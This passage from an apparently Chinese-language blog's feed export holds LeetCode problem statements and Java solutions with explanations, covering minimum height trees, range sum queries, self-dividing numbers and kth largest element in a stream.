<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] bfs(Map&lt;Integer, List&lt;Integer&gt;&gt; graph, <span class="keyword">int</span>[] edgeTo, <span class="keyword">int</span> s) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] distTo = <span class="keyword">new</span> <span class="keyword">int</span>[edgeTo.length];</span><br><span class="line">    <span class="keyword">boolean</span>[] mark = <span class="keyword">new</span> <span class="keyword">boolean</span>[edgeTo.length];</span><br><span class="line">    Queue&lt;Integer&gt; q = <span class="keyword">new</span> ArrayDeque&lt;&gt;();</span><br><span class="line">    q.offer(s);</span><br><span class="line">    mark[s] = <span class="keyword">true</span>;</span><br><span class="line">    distTo[s] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!q.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">int</span> v = q.poll();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> w : graph.get(v)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!mark[w]) &#123;</span><br><span class="line">                mark[w] = <span class="keyword">true</span>;</span><br><span class="line">                distTo[w] = distTo[v] + <span class="number">1</span>;</span><br><span class="line">                edgeTo[w] = v;</span><br><span class="line">                q.offer(w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> longestPath = <span class="number">0</span>, longestDist = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; distTo.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (distTo[i] &gt; longestDist) &#123;</span><br><span class="line">            longestDist = distTo[i];</span><br><span class="line">            longestPath = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;longestDist, longestPath&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">findMinHeightTrees</span><span class="params">(<span class="keyword">int</span> N, <span class="keyword">int</span>[][] edges)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// construct graph</span></span><br><span class="line">    Map&lt;Integer, List&lt;Integer&gt;&gt; graph = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        graph.put(i, <span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; edges.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v = edges[i][<span class="number">0</span>], w = edges[i][<span class="number">1</span>];</span><br><span class="line">        graph.get(v).add(w);    <span class="comment">// v-&gt;w</span></span><br><span class="line">        graph.get(w).add(v);    <span class="comment">// w-&gt;v</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// two bfs to find longest path v-w</span></span><br><span class="line">    <span class="keyword">int</span>[] edgeTo = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">    <span class="keyword">int</span> v = bfs(graph, edgeTo, <span class="number">0</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> tmp[] = bfs(graph, edgeTo, v);</span><br><span class="line">    <span class="keyword">int</span> w = tmp[<span class="number">1</span>], longestDist = tmp[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find roots (mid-points) of longest path v-w</span></span><br><span class="line">    List&lt;Integer&gt; roots = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> mid = w;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; longestDist / <span class="number">2</span>; i++)</span><br><span class="line">        mid = edgeTo[mid];</span><br><span class="line">    roots.add(mid);</span><br><span class="line">    <span class="keyword">if</span> (longestDist % <span class="number">2</span> == <span class="number">1</span>) <span class="comment">// two middle points</span></span><br><span class="line">        roots.add(edgeTo[mid]);</span><br><span class="line">    <span class="keyword">return</span> roots;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而第二种方法非常巧妙了，改自BFS拓扑排序。非常类似“剥洋葱”法BFS：从叶子节点剥向根节点。可以这么设想：最简单的图是什么？ a path graph，连成一条直线的图，那么怎么寻找该图的根节点？使用两个指针，一个指向尾部end, 一个指向首部front, 然后依次向中间移动。对于一个任意无向图，这样的path graph有很多，那么指针的前后向中间移动，可以抽象成一个外面的面向中间收缩，也就是剥洋葱了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">findMinHeightTrees</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span>[][] edges)</span> </span>&#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; graph = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">    List&lt;Integer&gt; roots = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// special case: one vertex</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123; roots.add(<span class="number">0</span>); <span class="keyword">return</span> roots; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// degree of every vertex</span></span><br><span class="line">    <span class="keyword">int</span>[] degree = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; n; i++) graph.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize degree and graph</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;edges.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v = edges[i][<span class="number">0</span>], w = edges[i][<span class="number">1</span>];</span><br><span class="line">        graph.get(v).add(w);</span><br><span class="line">        graph.get(w).add(v);</span><br><span class="line">        degree[v]++;</span><br><span class="line">        degree[w]++;</span><br><span class="line">    &#125;        </span><br><span class="line">        </span><br><span class="line">    <span class="comment">// add leaves</span></span><br><span class="line">    Queue&lt;Integer&gt; leaves = <span class="keyword">new</span> ArrayDeque&lt;Integer&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; n; i++) </span><br><span class="line">        <span class="keyword">if</span> (degree[i] == <span class="number">1</span>) leaves.offer(i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!leaves.isEmpty()) &#123; <span class="comment">//剥一层叶子</span></span><br><span class="line">        roots = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();   <span class="comment">// 根就是最后一层叶子</span></span><br><span class="line">        <span class="keyword">int</span> leave_size = leaves.size();  <span class="comment">// 这层叶子大小，把这层叶子剥掉</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; leave_size; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> leaf = leaves.poll();  </span><br><span class="line">            roots.add(leaf);        <span class="comment">// 加入叶子</span></span><br><span class="line">            degree[leaf]--;         <span class="comment">// 叶子的度减去1</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> next : graph.get(leaf)) &#123;  <span class="comment">// 遍历连接叶子的节点</span></span><br><span class="line">                <span class="keyword">if</span> (degree[next] == <span class="number">0</span>) <span class="keyword">continue</span>;   <span class="comment">// 原本就是叶子，i.e.外层</span></span><br><span class="line">                <span class="keyword">if</span> (degree[next] == <span class="number">2</span>) leaves.offer(next); <span class="comment">// 把这个节点变成叶子</span></span><br><span class="line">                degree[next]--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;      	</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> roots;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Breath-first Search </tag>
            
            <tag> Graph </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[309. Best Time to Buy and Sell Stock with Cooldown]]></title>
      <url>/wiki/2017/10/30/Leetcode-309-Best-Time-to-Buy-and-Sell-Stock-with-Cooldown/</url>
      <content type="html"><![CDATA[<p>Say you have an array for which the $i^{th}$ element is the price of a given stock on day $i$.</p>
<p>Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times) with the following restrictions:</p>
<ul>
<li>You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).</li>
<li>After you sell your stock, you cannot buy stock on next day. (ie, cooldown 1 day)</li>
</ul>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3,0,2]</span><br><span class="line">Output: 3 </span><br><span class="line">Explanation: transactions = [buy, sell, cooldown, buy, sell]</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[304. Range Sum Query 2D - Immutable]]></title>
      <url>/wiki/2017/10/30/Leetcode-304-Range-Sum-Query-2D-Immutable/</url>
      <content type="html"><![CDATA[<p>Given a 2D matrix <em>matrix</em>, find the sum of the elements inside the rectangle defined by its upper left corner (<em>row1</em>, <em>col1</em>) and lower right corner (<em>row2</em>, <em>col2</em>).</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15407011591216.png?imageslim" alt=""></p>
<p><small>The above rectangle (with the red border) is defined by (row1, col1) = (2, 1) and (row2, col2) = (4, 3), which contains sum = 8.</small></p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Given matrix = [</span><br><span class="line">  [3, 0, 1, 4, 2],</span><br><span class="line">  [5, 6, 3, 2, 1],</span><br><span class="line">  [1, 2, 0, 1, 5],</span><br><span class="line">  [4, 1, 0, 1, 7],</span><br><span class="line">  [1, 0, 3, 0, 5]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">sumRegion(2, 1, 4, 3) -&gt; 8</span><br><span class="line">sumRegion(1, 1, 2, 2) -&gt; 11</span><br><span class="line">sumRegion(1, 2, 2, 4) -&gt; 12</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>You may assume that the matrix does not change.</li>
<li>There are many calls to <em>sumRegion</em> function.</li>
<li>You may assume that <em>row1</em> ≤ <em>row2</em> and <em>col1</em> ≤ <em>col2</em>.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是LeetCode 303. Range Sum Query - Immutable的加强版，关键是找到动态规划的状态转移方程。</p>
<p>一种非常巧妙的方法是将矩形的和，转换为一系列矩形的和，用<code>sum()</code>表示矩形的面积，例如图</p>
<p><img src="http://phpk72ttq.bkt.clouddn.com/15414103991239.png?imageslim" alt=""></p>
<p>中的矩形ABCD可以用OD、OB、OC、OA来表示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sum(ABCD)=Sum(OD)−Sum(OB)−Sum(OC)+Sum(OA)</span><br></pre></td></tr></table></figure>
<p>这样一来，只要将以(0,0)为左上角，(i,j)为右下角的矩形的面积保存起来，任意两点构造的矩形的面积就非常容易求解了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NumMatrix</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[][] regionSum;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NumMatrix</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = matrix.length, n = m &gt; <span class="number">0</span> ? matrix[<span class="number">0</span>].length : <span class="number">0</span>;</span><br><span class="line">        regionSum = <span class="keyword">new</span> <span class="keyword">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">                regionSum[i][j] = regionSum[i - <span class="number">1</span>][j] + regionSum[i][j - <span class="number">1</span>] - </span><br><span class="line">                regionSum[i - <span class="number">1</span>][j - <span class="number">1</span>] + matrix[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumRegion</span><span class="params">(<span class="keyword">int</span> row1, <span class="keyword">int</span> col1, <span class="keyword">int</span> row2, <span class="keyword">int</span> col2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  regionSum[row2+<span class="number">1</span>][col2+<span class="number">1</span>]  +  regionSum[row1][col1] </span><br><span class="line">            - regionSum[row1][col2+<span class="number">1</span>] - regionSum[row2+<span class="number">1</span>][col1];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[303. Range Sum Query - Immutable]]></title>
      <url>/wiki/2017/10/30/Leetcode-303-Range-Sum-Query-Immutable/</url>
      <content type="html"><![CDATA[<p>Given an integer array <code>nums</code>, find the sum of the elements between indices $i$ and $j$ ($i ≤ j$), inclusive.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [-2, 0, 3, -5, 2, -1]</span><br><span class="line"></span><br><span class="line">sumRange(0, 2) -&gt; 1</span><br><span class="line">sumRange(2, 5) -&gt; -1</span><br><span class="line">sumRange(0, 5) -&gt; -3</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>You may assume that the array does not change.</li>
<li>There are many calls to <code>sumRange</code> function.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目还是非常直接的。难就难在题目说有大量的函数调用。既然是大量的函数调用，肯定需要把结果以某种形式预先存储起来。是直接存储结果吗？如果直接存储每个区间[$i,j$]之间的和，需要$O(n^2)$的空间和时间复杂度，当$n$大的时候肯定是不可取的。例如当$n=1000$时，大概需要4GB的存储，这样的算法不可能被实际应用。</p>
<p>一种比较好的思路是将前$i$个和存储起来，那么$i$到$j$之间的和，不就是两个和的差吗？基于这个思路空间复杂度降低为$O(n)$.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] sum;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NumArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    sum = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; sum.length; i++)</span><br><span class="line">        sum[i] = sum[i - <span class="number">1</span>] + nums[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumRange</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sum[j + <span class="number">1</span>] - sum[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[300. Longest Increasing Subsequence]]></title>
      <url>/wiki/2017/10/30/Leetcode-300-Longest-Increasing-Subsequence/</url>
      <content type="html"><![CDATA[<p>Given an unsorted array of integers, find the length of longest increasing subsequence.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [10,9,2,5,3,7,101,18]</span><br><span class="line">Output: 4 </span><br><span class="line">Explanation: The longest increasing subsequence is [2,3,7,101], therefore the length is 4.</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:</p>
<ul>
<li>There may be more than one LIS combination, it is only necessary for you to return the length.</li>
<li>Your algorithm should run in $O(n^2)$ complexity.</li>
<li>Follow up: Could you improve it to $O(n \log n)$ time complexity?</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[297. Serialize and Deserialize Binary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-297-Serialize-and-Deserialize-Binary-Tree/</url>
      <content type="html"><![CDATA[<p>Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment.</p>
<p>Design an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure.</p>
<p>Example: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">You may serialize the following tree:</span><br><span class="line"></span><br><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line">     / \</span><br><span class="line">    4   5</span><br><span class="line"></span><br><span class="line">as &quot;[1,2,3,null,null,4,5]&quot;</span><br></pre></td></tr></table></figure>
<p><strong>Clarification</strong>: The above format is the same as how LeetCode serializes a binary tree. You do not necessarily need to follow this format, so please be creative and come up with different approaches yourself.</p>
<p><strong>Note</strong>: Do not use class member/global/static variables to store states. Your serialize and deserialize algorithms should be stateless.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Design </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[728. Self Dividing Numbers]]></title>
      <url>/wiki/2017/10/30/Leetcode-728-Self-Dividing-Numbers/</url>
      <content type="html"><![CDATA[<p>A <em>self-dividing</em> number is a number that is divisible by every digit it contains.</p>
<p>For example, 128 is a self-dividing number because <code>128 % 1 == 0</code>, <code>128 % 2 == 0</code>, and <code>128 % 8 == 0.</code></p>
<p>Also, a self-dividing number is not allowed to contain the digit zero.</p>
<p>Given a lower and upper number bound, output a list of every possible self dividing number, including the bounds if possible.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">left = 1, right = 22</span><br><span class="line">Output: [1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 15, 22]</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>: The boundaries of each input argument are <code>1 &lt;= left &lt;= right &lt;= 10000</code>.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>考察数字的基本操作。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">selfDividingNumbers</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num = left; num &lt;= right; num++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">10</span>) &#123;res.add(num); <span class="keyword">continue</span>;&#125;</span><br><span class="line">        <span class="keyword">int</span> numCopy = num;</span><br><span class="line">        <span class="keyword">while</span> (numCopy != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> digit = numCopy % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (digit == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (num % digit != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            numCopy /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (numCopy == <span class="number">0</span>) res.add(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[703. Kth Largest Element in a Stream]]></title>
      <url>/wiki/2017/10/30/Leetcode-703-Kth-Largest-Element-in-a-Stream/</url>
      <content type="html"><![CDATA[<p>Design a class to find the <strong>k</strong>th largest element in a stream. Note that it is the <strong>k</strong>th largest element in the sorted order, not the <strong>k</strong>th distinct element.</p>
<p>Your <code>KthLargest</code> class will have a constructor which accepts an integer <code>k</code> and an integer array <code>nums</code>, which contains initial elements from the stream. For each call to the method <code>KthLargest.add</code>, return the element representing the kth largest element in the stream.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int k = 3;</span><br><span class="line">int[] arr = [4,5,8,2];</span><br><span class="line">KthLargest kthLargest = new KthLargest(3, arr);</span><br><span class="line">kthLargest.add(3);   // returns 4</span><br><span class="line">kthLargest.add(5);   // returns 5</span><br><span class="line">kthLargest.add(10);  // returns 5</span><br><span class="line">kthLargest.add(9);   // returns 8</span><br><span class="line">kthLargest.add(4);   // returns 8</span><br></pre></td></tr></table></figure>
<p>Note:<br>You may assume that nums’ length $≥ k-1$ and $k ≥ 1$.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>首先最简单的方法是，对整个数组进行排序，然后通过数组下标索引并返回该元素。时间复杂度是$O(n\log n)$，空间复杂度是$O(1)$.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">return</span> nums[nums.length - k];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其次，很自然的想到使用二叉堆处理最大值。在Java中二叉堆可以用<code>PriorityQueue</code>来表示，首先将数组元素依次加入到二叉堆中，然后连续取$k$次最大值即可，第$k$次的返回结果就是第$k$大的值。时间复杂度是$O(n\log n)$，空间复杂度是$O(n)$.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; heap = <span class="keyword">new</span> PriorityQueue&lt;Integer&gt;(</span><br><span class="line">            nums.length, Collections.reverseOrder()); <span class="comment">// 注意堆的顺序reverse         </span></span><br><span class="line">    heap.addAll(Arrays.asList(num));                 <span class="comment">// 加入所有元素到堆中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k - <span class="number">1</span>; i ++)</span><br><span class="line">        heap.poll();</span><br><span class="line">    <span class="keyword">return</span> heap.poll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是以上的两种方法都不能应用，原因就在于除了<code>findKthLargest</code>方法，还需要实现<code>add</code>方法来添加元素。如果使用方法一，则每一次添加都需要重新排序；如果使用方法二，则每一次添加都需要重新加入所有元素到二叉堆中。算法的时间复杂度达到了$)(n^2)$以上。</p>
<p>所以必须改进以上两种方法。首先比较简单的，改进二叉堆：始终维持二叉堆的大小为$k$，当二叉堆的大小超过$k$时，删除最小值。时间复杂度是$O(n\log k)$，空间复杂度是$O(n)$.</p>
